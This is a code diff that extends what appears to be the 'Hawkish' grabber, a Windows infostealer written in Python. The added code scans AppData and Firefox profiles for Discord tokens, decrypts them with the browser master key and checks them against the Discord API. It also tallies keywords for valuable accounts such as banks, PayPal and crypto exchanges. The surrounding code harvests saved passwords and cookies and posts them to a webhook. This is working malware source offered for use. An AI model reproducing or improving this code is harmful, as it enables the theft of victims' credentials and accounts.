@@ -345,6 +345,48 @@ class hwkish_first_funct(Functions):
             'friendlybabymc': 0,
             'wifinet': 0
         }
+        self.ccounter ={
+    "mail": 0,
+    "[gmail](https://gmail.com)": 0,
+    "[sellix](https://sellix.io)": 0,
+    "[steam](https://steam.com)": 0,
+    "[discord](https://discord.com)": 0,
+    "[riotgames](https://riotgames.com)": 0,
+    "[youtube](https://youtube.com)": 0,
+    "[instagram](https://instagram.com)": 0,
+    "[tiktok](https://tiktok.com)": 0,
+    "[twitter](https://twitter.com)": 0,
+    "[facebook](https://facebook.com)": 0,
+    "card": 0,
+    "[epicgames](https://epicgames.com)": 0,
+    "[spotify](https://spotify.com)": 0,
+    "[yahoo](https://yahoo.com)": 0,
+    "[roblox](https://roblox.com)": 0,
+    "[twitch](https://twitch.com)": 0,
+    "[minecraft](https://minecraft.net)": 0,
+    "bank": 0,
+    "[paypal](https://paypal.com)": 0,
+    "[origin](https://origin.com)": 0,
+    "[amazon](https://amazon.com)": 0,
+    "[ebay](https://ebay.com)": 0,
+    "[aliexpress](https://aliexpress.com)": 0,
+    "[playstation](https://playstation.com)": 0,
+    "[hbo](https://hbo.com)": 0,
+    "[xbox](https://xbox.com)": 0,
+    "buy": 0,
+    "sell": 0,
+    "[binance](https://binance.com)": 0,
+    "[hotmail](https://hotmail.com)": 0,
+    "[outlook](https://outlook.com)": 0,
+    "[crunchyroll](https://crunchyroll.com)": 0,
+    "[telegram](https://telegram.com)": 0,
+    "[pornhub](https://pornhub.com)": 0,
+    "[disney](https://disney.com)": 0,
+    "[expressvpn](https://expressvpn.com)": 0,
+    "crypto": 0,
+    "[uber](https://uber.com)": 0,
+    "[netflix](https://netflix.com)": 0,
+        }
 
         self.thishawk_webh = self.ecobybro
 
@@ -402,14 +444,12 @@ class hwkish_first_funct(Functions):
         self.pc_codewinl = locale.getdefaultlocale()[0]
         self.fastmem_stored = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
 
-        # Convert to GB
         self.total_gb = self.total / (2**30)
         self.used_gb = self.used / (2**30)
         self.free_gb = self.free / (2**30)
 
         self.used_percent = self.used / self.total * 100
 
-        # Generate progress bar
         self.progress_bar_length = 20
         self.num_filled_blocks = int(
             self.used_percent / 100 * self.progress_bar_length)
@@ -553,12 +593,12 @@ class hwkish_first_funct(Functions):
             return
         ping1 = {
             "username": f"{hwkish} - {grbber}",
-            "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/{myname_little}.png",
+            "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/hawkish.png",
             "content": "@everyone",
         }
         ping2 = {
             "username": f"{hwkish} - {grbber}",
-            "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/{myname_little}.png",
+            "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/hawkish.png",
             "content": "@here",
         }
         if self.webapi_find in self.thishawk_webh:
@@ -1267,64 +1307,46 @@ class hwkish_first_funct(Functions):
         except Exception:
             return "Failed to decrypt password"
 
-    def found_thismasterk3y(self, path):
-        with open(path, "r", encoding="utf-8") as f:
-            c = f.read()
-        local_state = json.loads(c)
-        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        master_key = master_key[5:]
-        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-        return master_key
-
     def found_thistkn(self):
-        paths = {
-            "Discord": self.roaming + "\\discord\\Local Storage\\leveldb\\",
-            "Discord Canary": self.roaming + "\\discordcanary\\Local Storage\\leveldb\\",
-            "Lightcord": self.roaming + "\\Lightcord\\Local Storage\\leveldb\\",
-            "Discord PTB": self.roaming + "\\discordptb\\Local Storage\\leveldb\\",
-            "Opera": self.roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
-            "Opera GX": self.roaming + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
-            "Amigo": self.appdata + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
-            "Torch": self.appdata + "\\Torch\\User Data\\Local Storage\\leveldb\\",
-            "Kometa": self.appdata + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
-            "Orbitum": self.appdata + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
-            "CentBrowser": self.appdata + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
-            "7Star": self.appdata + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
-            "Sputnik": self.appdata + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
-            "Vivaldi": self.appdata + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
-            "Chrome SxS": self.appdata + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
-            "Chrome": self.appdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
-            "Chrome1": self.appdata + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
-            "Chrome2": self.appdata + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",
-            "Chrome3": self.appdata + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",
-            "Chrome4": self.appdata + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",
-            "Chrome5": self.appdata + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",
-            "Epic Privacy Browser": self.appdata + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
-            "Microsoft Edge": self.appdata + "\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",
-            "Uran": self.appdata + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
-            "Yandex": self.appdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
-            "Brave": self.appdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
-            "Iridium": self.appdata + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
-        }
-
-        for name, path in paths.items():
+        paths_to_check = []
+        
+        roaming_path = os.path.expanduser('~\\AppData\\Roaming')
+        for root, dirs, files in os.walk(roaming_path):
+            for file in files:
+                if file.endswith('.ldb'):
+                    paths_to_check.append(root)
+                    break
+        
+        local_path = os.path.expanduser('~\\AppData\\Local')
+        for root, dirs, files in os.walk(local_path):
+            for file in files:
+                if file.endswith('.ldb'):
+                    paths_to_check.append(root)
+                    break
+        
+        for path in paths_to_check:
             if not os.path.exists(path):
                 continue
-            disc = name.replace(" ", "").lower()
+            
+            disc = os.path.basename(path).replace(" ", "").lower()
+            
             if "cord" in path:
-                if os.path.exists(self.roaming + f"\\{disc}\\Local State"):
-                    for filname in os.listdir(path):
-                        if filname[-3:] not in ["log", "ldb"]:
+                local_state_path = os.path.join(self.roaming, disc, "Local State")
+                if os.path.exists(local_state_path):
+                    for filename in os.listdir(path):
+                        if filename[-3:] not in ["log", "ldb"]:
                             continue
                         for line in [
                             x.strip()
-                            for x in open(f"{path}\\{filname}", errors="ignore").readlines()
+                            for x in open(os.path.join(path, filename), errors="ignore").readlines()
                             if x.strip()
                         ]:
                             for y in re.findall(self.regexcrypt, line):
                                 try:
                                     token = self.decrypt_this_value(
-                                        base64.b64decode(y.split("dQw4w9WgXcQ:")[1]), self.found_thismasterk3y(self.roaming + f"\\{disc}\\Local State"),)
+                                        base64.b64decode(y.split("dQw4w9WgXcQ:")[1]),
+                                        self.found_thismasterk3y(local_state_path),
+                                    )
                                 except ValueError:
                                     pass
                                 try:
@@ -1343,6 +1365,60 @@ class hwkish_first_funct(Functions):
                                     if uid not in self.hwkishid:
                                         self.hawked.append(token)
                                         self.hwkishid.append(uid)
+            else:
+                for filename in os.listdir(path):
+                    if filename[-3:] not in ["log", "ldb"]:
+                        continue
+                    for line in [
+                        x.strip()
+                        for x in open(os.path.join(path, filename), errors="ignore").readlines()
+                        if x.strip()
+                    ]:
+                        for token in re.findall(self.regex, line):
+                            try:
+                                r = requests.get(
+                                    self.disc_url_api,
+                                    headers={
+                                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+                                        "Content-Type": "application/json",
+                                        "Authorization": token,
+                                    },
+                                )
+                            except Exception:
+                                pass
+                            if r.status_code == 200:
+                                uid = r.json()["id"]
+                                if uid not in self.hwkishid:
+                                    self.hawked.append(token)
+                                    self.hwkishid.append(uid)
+        
+        if os.path.exists(os.path.join(self.roaming, "Mozilla\\Firefox\\Profiles")):
+            for path, _, files in os.walk(os.path.join(self.roaming, "Mozilla\\Firefox\\Profiles")):
+                for _file in files:
+                    if not _file.endswith(".sqlite"):
+                        continue
+                    for line in [
+                        x.strip()
+                        for x in open(os.path.join(path, _file), errors="ignore").readlines()
+                        if x.strip()
+                    ]:
+                        for token in re.findall(self.regex, line):
+                            try:
+                                r = requests.get(
+                                    self.disc_url_api,
+                                    headers={
+                                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+                                        "Content-Type": "application/json",
+                                        "Authorization": token,
+                                    },
+                                )
+                            except Exception:
+                                pass
+                            if r.status_code == 200:
+                                uid = r.json()["id"]
+                                if uid not in self.hwkishid:
+                                    self.hawked.append(token)
+                                    self.hwkishid.append(uid)
             else:
                 for filname in os.listdir(path):
                     if filname[-3:] not in ["log", "ldb"]:
@@ -1428,6 +1504,7 @@ class hwkish_first_funct(Functions):
         finally:
             conn.close()
             os.remove(loginvault)
+
 
     @extract_try
     def gang_hwkstl(self, file_name: str, file_path: str, proc_file: str):
@@ -1835,7 +1912,7 @@ class hwkish_first_funct(Functions):
 
         embed = {
             "username": f"{hwkish}-{grbber}",
-            "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/{myname_little}.png",
+            "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/hawkish.png",
             "embeds": [
                 {
                     "author": {
@@ -2168,7 +2245,7 @@ def upload(name, tk=""):
                     "color": 16734976,
                 }
             ],
-            "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/{myname_little}.png",
+            "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/hawkish.png",
             "username": f"{hwkish} - {grbber}",
             "attachments": [],
         }
@@ -2199,7 +2276,7 @@ def upload(name, tk=""):
                     "color": 16734976,
                 }
             ],
-            "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/{myname_little}.png",
+            "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/hawkish.png",
             "username": f"{hwkish} - {grbber}",
             "attachments": [],
         }
@@ -2225,7 +2302,7 @@ def upload(name, tk=""):
                     "color": 16734976,
                 }
             ],
-            "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/{myname_little}.png",
+            "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/hawkish.png",
             "username": f"{hwkish} - {grbber}",
             "attachments": [],
         }
@@ -2286,7 +2363,7 @@ def hwkishfind_pswd(path, arg):
                     if not old in words_passw:
                         words_passw.append(old)
             Notpasswrd.append(
-                f"LINK: {row[0]} \n IDENT:{row[1]} \n {hwkish}-{grbber}  PASSW:{decryption_value(row[2], master_key)}\n\n"
+                f"LINK: {row[0]} \n IDENT: {row[1]} \n {hwkish}-{grbber}  PASSW: {decryption_value(row[2], master_key)}\n\n"
             )
     writeforfile(Notpasswrd, f"{hwkish}_allpasswords")
 
@@ -2344,13 +2421,8 @@ def hwkishfind_c00ks(path, arg):
 
 
 def checkIfProcessRunning(processName):
-    """
-    Check if there is any running process that contains the given name processName.
-    """
-    # Iterate over the all the running process
     for proc in psutil.process_iter():
         try:
-            # Check if process name contains the given name string.
             if processName.lower() in proc.name().lower():
                 return True
         except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
